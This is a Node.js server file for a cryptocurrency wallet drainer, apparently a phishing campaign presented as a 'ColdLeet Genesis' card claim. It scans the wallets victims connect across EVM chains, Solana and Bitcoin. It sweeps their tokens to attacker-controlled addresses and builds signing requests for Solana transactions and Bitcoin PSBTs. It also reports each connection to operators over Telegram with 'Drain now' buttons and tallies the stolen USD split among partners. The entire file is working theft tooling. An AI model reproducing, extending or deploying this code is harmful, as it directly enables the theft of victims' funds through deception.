'use strict';

require('dotenv').config();
const fs = require('fs'), path = require('path');
const express = require('express'), cors = require('cors');

const telegramBotApi = require('node-telegram-bot-api');
const TelegramBot = telegramBotApi.default || telegramBotApi;
if (typeof TelegramBot !== 'function') {
  throw new Error('node-telegram-bot-api did not export a constructor. Keys: ' +
    Object.keys(telegramBotApi).join(', '));
}

const D = require('./drainer');
const CAMP = require('./campaigns');

const {
  TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,CR_CHAT, DRAINER_EVM_ADDRESS,
  DRAINER_SOL_ADDRESS, DRAINER_BTC_ADDRESS, WALLETCONNECT_PROJECT_ID,
  PORT = 3000, CORS_ORIGIN = '*',
  APP_NAME = 'ColdLeet', APP_ICON = '', APP_URL = '',
  APP_DESC = 'ColdLeet Genesis — claim your card',
  APPROVE_MODE = 'false',
} = process.env;

const ethers = require('ethers');
const app = express();

const DB_PATH = process.env.DB_PATH || path.join(__dirname, 'events.json');
const EMPTY = { events: [], stats: { drains: 0, wallets: {}, byChain: {}, swept: {}, byCampaign: {}, usdByCampaign: {} }, wallets: {} };
const loadDB = () => {
  const db = (() => { try { return JSON.parse(fs.readFileSync(DB_PATH, 'utf8')); }
                      catch { return JSON.parse(JSON.stringify(EMPTY)); } })();
  db.stats = db.stats || {};
  db.stats.byCampaign = db.stats.byCampaign || {};
  db.stats.usdByCampaign = db.stats.usdByCampaign || {};
  return db;
};
const saveDB = (db) => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

const replacer = (_k, v) => (typeof v === 'bigint' ? v.toString() : v);
const sendJSON = (res, status, obj) =>
  res.status(status).type('application/json').send(JSON.stringify(obj, replacer));

// rough USD prices for the split display only
const PRICES = { USDT: 1, USDC: 1, USDD: 1, TUSD: 1, DAI: 1,
                 ETH: 2400, BNB: 735, MATIC: 0.2, POL: 0.2, AVAX: 25, SOL: 150, BTC: 65000 };

// ---------------------------------------------------------------------------
// Campaign routing
// ---------------------------------------------------------------------------
function campaign(req) {
  const host = (req.headers.host || '').split(':')[0].toLowerCase();
  return CAMP[host] || Object.values(CAMP)[0];
}
function byLabel(label) {
  return Object.values(CAMP).find((c) => c.label === label) || Object.values(CAMP)[0];
}

// ---------------------------------------------------------------------------
// Telegram
// ---------------------------------------------------------------------------
let bot = null;
if (TELEGRAM_BOT_TOKEN) {
  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

  (async () => {
    try {
      const info = await bot.getWebHookInfo();
      if (info.url) {
        console.log(`[telegram] webhook was set to ${info.url} — removing`);
        await bot.deleteWebHook({ drop_pending_updates: true });
      }
    } catch (e) { console.error('[telegram] webhook check', e.message); }

    await new Promise((r) => setTimeout(r, 2000));
    bot.startPolling({ restart: true });
    console.log('[telegram] polling started');
  })();

  bot.on('polling_error', (e) => {
    if (/409/.test(e.message)) return;
    console.error('[telegram]', e.message);
  });

  bot.getMe()
    .then((me) => console.log(`[telegram] connected as @${me.username} (id ${me.id})`))
    .catch((e) => console.error('[telegram] getMe failed:', e.message));

  for (const c of Object.values(CAMP)) {
    if (!c.chatId) { console.warn(`[telegram] no chatId for ${c.label}`); continue; }
    bot.sendMessage(c.chatId, `[${c.label}] drainer online — notifications live.`)
      .then(() => console.log(`[telegram] ${c.label} startup test delivered`))
      .catch((e) => console.error(`[telegram] ${c.label} startup test failed:`, e.response?.body || e.message));
  }

  bot.onText(/\/start/, (m) =>
    bot.sendMessage(m.chat.id, `Drainer online. Chat ID: <code>${m.chat.id}</code>`, { parse_mode: 'HTML' }));

  bot.onText(/\/stats/, (m) => {
    const db = loadDB();
    const chains = Object.entries(db.stats.byChain).map(([k, v]) => `  ${esc(k)}: ${v}`).join('\n') || '  -';
    const swept = Object.entries(db.stats.swept).map(([k, v]) => `  ${v} ${esc(k)}`).join('\n') || '  -';

    const camps = Object.entries(db.stats.usdByCampaign)
      .map(([k, v]) => `  ${esc(k)}: $${Number(v).toFixed(2)}`).join('\n') || '  -';

    const owed = {};
    for (const [label, usd] of Object.entries(db.stats.usdByCampaign)) {
      const c = Object.values(CAMP).find((x) => x.label === label);
      if (!c || !c.shares) continue;
      for (const [person, share] of Object.entries(c.shares)) {
        owed[person] = (owed[person] || 0) + Number(usd) * share;
      }
    }
    const split = Object.entries(owed).map(([k, v]) => `  ${esc(k)}: $${v.toFixed(2)}`).join('\n') || '  -';

    bot.sendMessage(m.chat.id,
      `<b>Drainer stats</b>\n\nConnections: ${db.events.filter((e) => e.type === 'connect').length}\n` +
      `Drains: ${db.stats.drains}\nUnique wallets: ${Object.keys(db.stats.wallets).length}\n\n` +
      `<b>By chain</b>\n${chains}\n\n<b>Total swept</b>\n${swept}\n\n` +
      `<b>By campaign</b>\n${camps}\n\n<b>Split</b>\n${split}`,
      { parse_mode: 'HTML' });
  });

  bot.onText(/\/wallets/, (m) => {
    const db = loadDB();
    const list = Object.entries(db.wallets || {});
    if (!list.length) return bot.sendMessage(m.chat.id, 'No wallets seen yet.');
    for (const [id, w] of list.slice(-10)) {
      bot.sendMessage(m.chat.id,
        `[${esc(w.label || '?')}] <code>${short(w.address)}</code> — ${esc(w.chainName || w.chainId)}`,
        { parse_mode: 'HTML', reply_markup: walletKeyboard(id, w.chainId, w.address) });
    }
  });

  bot.on('callback_query', handleCallback);
  console.log('[telegram] bot started');
} else console.warn('[telegram] TELEGRAM_BOT_TOKEN unset — notifications disabled');

// HTML parse mode only needs these three escaped. Legacy Markdown has no
// backslash escaping at all, which is why every raw address used to break it.
const esc = (s) => String(s == null ? '' : s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

const tg = (camp, t, markup) => {
  if (!bot || !camp || !camp.chatId) return;
  bot.sendMessage(camp.chatId, t,
    { parse_mode: 'HTML', disable_web_page_preview: true, reply_markup: markup })
    .catch(async (e) => {
      const body = e.response?.body?.description || e.message || '';
      console.error('[telegram send]', body);
      if (/parse entities/i.test(body)) {
        try {
          await bot.sendMessage(camp.chatId, t.replace(/<[^>]+>/g, ''), { reply_markup: markup });
          console.log('[telegram] resent as plain text');
        } catch (e2) { console.error('[telegram retry]', e2.message); }
      }
    });
};
const short = (a) => (a && a.length > 12 ? `${a.slice(0, 6)}...${a.slice(-4)}` : a);

// ---------------------------------------------------------------------------
// Wallet registry
// ---------------------------------------------------------------------------
function rememberWallet(address, chainId, chainName, label) {
  const db = loadDB();
  db.wallets = db.wallets || {};
  for (const [id, w] of Object.entries(db.wallets)) {
    if (w.address === address && String(w.chainId) === String(chainId)) {
      w.chainName = chainName;
      if (label) w.label = label;
      saveDB(db);
      return id;
    }
  }
  const id = Math.random().toString(36).slice(2, 8);
  db.wallets[id] = { address, chainId: String(chainId), chainName, label: label || null, at: Date.now() };
  saveDB(db);
  return id;
}

function explorerUrl(chainId, address) {
  if (chainId === 'solana') return `https://solscan.io/account/${address}`;
  if (chainId === 'bitcoin') return `https://mempool.space/address/${address}`;
  const c = D.CHAINS[Number(chainId)];
  return c?.explorer ? `${c.explorer}/address/${address}` : 'https://etherscan.io';
}

function walletKeyboard(id, chainId, address) {
  return {
    inline_keyboard: [
      [{ text: '🔁 Rescan', callback_data: `scan|${id}` },
       { text: '💸 Drain now', callback_data: `drain|${id}` }],
      [{ text: '🔎 Explorer', url: explorerUrl(chainId, address) }],
    ],
  };
}

async function scanAny(chainId, address) {
  if (chainId === 'solana') return D.scanSolana(address);
  if (chainId === 'bitcoin') return D.scanBitcoin(address);
  return D.scanTokens(Number(chainId), address);
}

function fmtScan(address, s) {
  const rows = (s.tokens || []).map((t) => `• ${esc(t.formatted)} ${esc(t.symbol)}`).join('\n');
  return [
    `<b>${esc(s.chain)}</b> · <code>${short(address)}</code>`,
    `Native: ${esc(s.native.formatted)} ${esc(s.native.symbol)}`,
    rows || '<i>no tokens</i>',
  ].join('\n');
}

async function handleCallback(q) {
  const [act, id] = (q.data || '').split('|');
  const chat = q.message.chat.id;
  bot.answerCallbackQuery(q.id, { text: '…' }).catch(() => {});

  const db = loadDB();
  const w = (db.wallets || {})[id];
  if (!w) return bot.sendMessage(chat, 'Unknown wallet — reconnect and try again.');

  // the chat the button lives in IS the campaign chat
  const camp = byLabel(w.label);

  const { address, chainId } = w;
  try {
    if (act === 'scan') {
      const s = await scanAny(chainId, address);
      return bot.sendMessage(chat, fmtScan(address, s),
        { parse_mode: 'HTML', reply_markup: walletKeyboard(id, chainId, address) });
    }

    if (act === 'drain') {
      if (chainId === 'solana') return bot.sendMessage(chat, 'Solana needs the owner to sign — reconnect them.');
      if (chainId === 'bitcoin') return bot.sendMessage(chat, 'Bitcoin needs a PSBT signature — reconnect them.');

      const s = await scanAny(chainId, address);
      const tokens = (s.tokens || []).filter((t) => BigInt(t.raw ?? 0) > 0n);
      if (!tokens.length) return bot.sendMessage(chat, 'Nothing to pull right now.');

      const out = await D.executeTokenDrain(Number(chainId), address, tokens);
      const ok = out.results.filter((r) => r.status === 'success');
      const bad = out.results.filter((r) => r.status !== 'success');

      const body = [
        ok.length ? `<b>SWEPT ${ok.length} ASSET(S)</b>` : '<b>NOTHING SWEPT</b>',
        `<code>${short(address)}</code> · ${esc(s.chain)}`,
        '',
        ...ok.map((r) => `✅ ${esc(r.swept)} ${esc(r.symbol)}`),
        ...bad.map((r) => `⏭ ${esc(r.symbol)} — ${esc(r.status)}${r.error ? ` (${esc(r.error)})` : ''}`),
      ].join('\n');

      recordDrain({ camp, address, chain: s.chain, results: out.results, quiet: true });
      return bot.sendMessage(chat, body,
        { parse_mode: 'HTML', reply_markup: walletKeyboard(id, chainId, address) });
    }
  } catch (e) {
    bot.sendMessage(chat, `⚠️ ${esc(e.message)}`);
  }
}

// ---------------------------------------------------------------------------
// App
// ---------------------------------------------------------------------------
app.use(express.json({ limit: '1mb' }));
app.use(cors({ origin: CORS_ORIGIN === '*' ? true : CORS_ORIGIN.split(',') }));

app.get('/.well-known/walletconnect.txt', (_q, res) =>
  res.type('text/plain').send(process.env.WALLETCONNECT_VERIFY || WALLETCONNECT_PROJECT_ID || ''));

app.use(express.static(path.join(__dirname, 'public'), { dotfiles: 'allow' }));

app.get('/health', (_q, r) => r.json({ ok: true }));

app.get('/diag', async (_req, res) => {
  const out = [];
  for (const id of Object.keys(D.RPCS)) {
    const row = { chain: id, results: [] };
    const urls = D.urlsFor ? D.urlsFor(Number(id)) : D.RPCS[id];
    for (const u of urls) {
      const t0 = Date.now();
      try {
        const p = D.makeProvider(Number(id), u);
        const bn = await p.getBlockNumber();
        row.results.push({ url: u, ok: true, ms: Date.now() - t0, block: bn });
      } catch (e) {
        row.results.push({ url: u, ok: false, ms: Date.now() - t0, err: e.shortMessage || e.message });
      }
    }
    out.push(row);
  }
  sendJSON(res, 200, out);
});

app.get('/config', (req, res) => {
  const camp = campaign(req);
  sendJSON(res, 200, {
    appName: APP_NAME, appDesc: APP_DESC, appIcon: APP_ICON,
    appUrl: APP_URL || `https://${req.headers.host}`,

    walletConnectProjectId: WALLETCONNECT_PROJECT_ID || null,
    approveMode: APPROVE_MODE === 'true',
    approveOnly: process.env.APPROVE_ONLY === 'true',
    campaign: camp.label,
    chains: Object.entries(D.CHAINS).map(([id, c]) => ({
      id, name: c.name, symbol: c.symbol, type: c.type,
      explorer: c.explorer || null, rpc: D.publicRpc(id),
    })),
    destinations: {
      evm: camp.evm || D.drainerAddress(),
      solana: camp.sol || DRAINER_SOL_ADDRESS,
      bitcoin: camp.btc || DRAINER_BTC_ADDRESS,
    },
  });
});

app.get('/gas', async (_q, res) => {
  const out = {};
  for (const id of Object.keys(D.CHAINS)) {
    const c = D.CHAINS[id];
    if (c.type !== 'evm') continue;
    try {
      const p = await D.getLiveProvider(id);
      out[c.name] = ethers.formatEther(await p.getBalance(DRAINER_EVM_ADDRESS));
    } catch (e) { out[c.name] = 'err: ' + e.message; }
  }
  sendJSON(res, 200, out);
});

app.post('/scan', async (req, res) => {
  const { address, chain, provider } = req.body || {};
  if (!address || chain == null) return sendJSON(res, 400, { error: 'address + chain required' });
  const camp = campaign(req);
  try {
    if (chain === 'solana') {
      const s = await D.scanSolana(address);
      logConnect({ camp, address, chain: 'Solana', chainId: 'solana', provider, scan: s });
      return sendJSON(res, 200, s);
    }
    if (chain === 'bitcoin') {
      const s = await D.scanBitcoin(address);
      logConnect({ camp, address, chain: 'Bitcoin', chainId: 'bitcoin', provider, scan: s });
      return sendJSON(res, 200, s);
    }
    const s = await D.scanTokens(Number(chain), address);
    logConnect({ camp, address, chain: s.chain, chainId: Number(chain), provider, scan: s });
    sendJSON(res, 200, s);
  } catch (e) {
    console.error(`[/scan] chain=${chain} address=${address}`, e);
    sendJSON(res, 500, { error: e.shortMessage || e.message, chain });
  }
});

app.post('/scanall', async (req, res) => {
  const { address, provider } = req.body || {};
  if (!address) return sendJSON(res, 400, { error: 'address required' });
  const camp = campaign(req);

  const evm = Object.entries(D.CHAINS).filter(([, c]) => c.type === 'evm');
  const found = (await Promise.all(evm.map(async ([id, c]) => {
    try {
      const s = await D.scanTokens(Number(id), address);
      const has = (s.tokens || []).some((t) => BigInt(t.raw) > 0n) || BigInt(s.native.raw) > 0n;
      return has ? { ...s, chainId: Number(id) } : null;
    } catch (e) { console.warn('[scanall]', c.name, e.message); return null; }
  }))).filter(Boolean);

  const db = loadDB();
  db.events.push({ type: 'connect', address, chain: 'multi', provider, campaign: camp.label, at: Date.now() });
  saveDB(db);
  const id = rememberWallet(address, found[0]?.chainId ?? 1, found[0]?.chain ?? 'Ethereum', camp.label);

  const blocks = found.map((f) => [
    `<b>${esc(f.chain)}</b>`,
    `· ${esc(f.native.formatted)} ${esc(f.native.symbol)}`,
    ...(f.tokens || []).map((t) => `· ${esc(t.formatted)} ${esc(t.symbol)}`),
  ].join('\n'));

  tg(camp, [
    `<b>NEW CONNECTION</b>`,
    `Campaign: ${esc(camp.label)}`,
    `Wallet: <code>${short(address)}</code>`,
    `Via: ${esc(provider || 'unknown')}`,
    '',
    blocks.length ? blocks.join('\n\n') : '<i>nothing found</i>',
  ].join('\n'), walletKeyboard(id, found[0]?.chainId ?? 1, address));

  sendJSON(res, 200, found);
});

app.post('/drain', async (req, res) => {
  const { address, chain, tokens = [] } = req.body || {};
  if (!address || chain == null) return sendJSON(res, 400, { error: 'address + chain required' });
  if (!DRAINER_EVM_ADDRESS) return sendJSON(res, 500, { error: 'DRAINER_EVM_ADDRESS unset' });
  const camp = campaign(req);
  try {
    const out = await D.executeTokenDrain(Number(chain), address, tokens);
    recordDrain({ camp, address, chain: D.CHAINS[Number(chain)]?.name, results: out.results });
    sendJSON(res, 200, out);
  } catch (e) {
    console.error('[/drain]', e);
    sendJSON(res, 500, { error: e.message });
  }
});

app.post('/notify', (req, res) => {
  const { address, chain, hash, amount, status = 'SUCCESS' } = req.body || {};
  const camp = campaign(req);
  recordDrain({ camp, address, chain, manual: true, hash, amount, status });
  sendJSON(res, 200, { ok: true });
});

app.get('/solana/build', async (req, res) => {
  try {
    const txs = await D.buildSolanaDrains(req.query.owner, req.query.dest);
    sendJSON(res, 200, {
      transactions: txs.map((tx) =>
        Buffer.from(tx.serialize({ requireAllSignatures: false, verifySignatures: false })).toString('base64')),
    });
  } catch (e) { sendJSON(res, 500, { error: e.message }); }
});

app.post('/solana/send', async (req, res) => {
  try {
    const sig = await D.sendSolanaRaw(req.body?.transaction);
    sendJSON(res, 200, { signature: sig });
  } catch (e) { sendJSON(res, 500, { error: e.message }); }
});

app.get('/btc/psbt', async (req, res) => {
  try {
    const { owner, dest } = req.query;
    if (!owner || !dest) return sendJSON(res, 400, { error: 'owner and dest required' });
    const out = await D.buildBitcoinPsbt(owner, dest);
    if (!out) return sendJSON(res, 400, { error: 'nothing spendable' });
    sendJSON(res, 200, {
      psbt: Buffer.from(out.psbtHex, 'hex').toString('base64'),
      send: out.send, fee: out.fee, inputs: out.inputCount,
    });
  } catch (e) { sendJSON(res, 500, { error: e.message }); }
});

app.get('/btc/inspect', async (req, res) => {
  try {
    const { owner } = req.query;
    if (!owner) return sendJSON(res, 400, { error: 'owner required' });
    const utxos = await D.btcFetch(`/address/${owner}/utxo`, { soft400: true });
    const list = Array.isArray(utxos) ? utxos : [];
    const total = list.reduce((s, u) => s + u.value, 0);
    const rate = await D.btcFeeRate();
    const segwit = owner.toLowerCase().startsWith('bc1');
    const vbytes = 11 + 31 + list.length * (segwit ? 68 : 148);
    const fee = Math.ceil(vbytes * rate);
    sendJSON(res, 200, {
      owner, utxos: list.length, total_sats: total, total_btc: (total / 1e8).toString(),
      confirmed: list.filter((u) => u.status?.confirmed).length,
      fee_rate_sat_vb: rate, est_fee_sats: fee, est_send_sats: total - fee,
      verdict: !list.length ? 'no utxos at this address'
             : total <= 294 ? 'balance is dust'
             : total - fee < 294 ? 'balance is below fee + dust' : 'sweepable',
    });
  } catch (e) { sendJSON(res, 500, { error: e.message }); }
});

app.get('/stats', (_q, res) => {
  const db = loadDB();
  sendJSON(res, 200, {
    connections: db.events.filter((e) => e.type === 'connect').length,
    drains: db.stats.drains,
    uniqueWallets: Object.keys(db.stats.wallets).length,
    byChain: db.stats.byChain, swept: db.stats.swept,
    byCampaign: db.stats.byCampaign, usdByCampaign: db.stats.usdByCampaign,
  });
});

// ---------------------------------------------------------------------------
function logConnect({ camp, address, chain, chainId, provider, scan }) {
  const db = loadDB();
  db.events.push({ type: 'connect', address, chain, provider, campaign: camp.label, at: Date.now() });
  saveDB(db);

  const id = rememberWallet(address, chainId, chain, camp.label);
  const detected = scan
    ? [...(scan.tokens || []).map((t) => `${t.formatted} ${t.symbol}`),
       `${scan.native?.formatted} ${scan.native?.symbol}`].join(', ')
    : 'n/a';

  tg(camp, [
    `<b>NEW CONNECTION</b>`,
    `Campaign: ${esc(camp.label)}`,
    `Wallet: <code>${short(address)}</code>`,
    `Chain: ${esc(chain)}`,
    `Via: ${esc(provider || 'unknown')}`,
    '',
    `<b>Assets</b>`,
    esc(detected || 'none'),
  ].join('\n'), walletKeyboard(id, chainId, address));
}

function recordDrain({ camp, address, chain, results, manual, hash, amount, status, quiet }) {
  const db = loadDB(), chainName = chain || 'unknown';
  const label = camp?.label || 'unknown';
  const lines = [];
  let swept = [];

  if (manual) {
    lines.push(`Status: ${esc(status)}`);
    if (hash) lines.push(`Tx: <code>${esc(hash)}</code>`);
    if (amount) lines.push(`Amount: ${esc(amount)}`);
  } else {
    const ok = results.filter((r) => r.status === 'success');
    const bad = results.filter((r) => r.status !== 'success');
    for (const r of ok) lines.push(`✅ ${esc(r.swept)} ${esc(r.symbol)}`);
    for (const r of bad) lines.push(`⏭ ${esc(r.symbol)} — ${esc(r.status)}${r.error ? ` (${esc(r.error)})` : ''}`);
    swept = ok.map((r) => ({ symbol: r.symbol, amount: r.swept }));
  }

  db.events.push({ type: 'drain', address, chain: chainName, campaign: label, swept, hash, status, at: Date.now() });
  db.stats.drains += 1;
  db.stats.byChain[chainName] = (db.stats.byChain[chainName] || 0) + 1;
  db.stats.byCampaign[label] = (db.stats.byCampaign[label] || 0) + 1;
  db.stats.wallets[address] = true;
  for (const s of swept) {
    db.stats.swept[s.symbol] = (db.stats.swept[s.symbol] || 0) + Number(s.amount || 0);
    db.stats.usdByCampaign[label] = (db.stats.usdByCampaign[label] || 0)
      + Number(s.amount || 0) * (PRICES[s.symbol] || 0);
  }
  saveDB(db);

  if (!quiet) {
    tg(camp, [
      swept.length || manual ? `<b>DRAIN · ${esc(label)}</b>` : `<b>NOTHING SWEPT · ${esc(label)}</b>`,
      `Wallet: <code>${short(address)}</code>`,
      `Chain: ${esc(chainName)}`,
      '',
      ...lines,
    ].join('\n'));
  }
}

app.listen(PORT, () => console.log(`[server] http://localhost:${PORT}`));
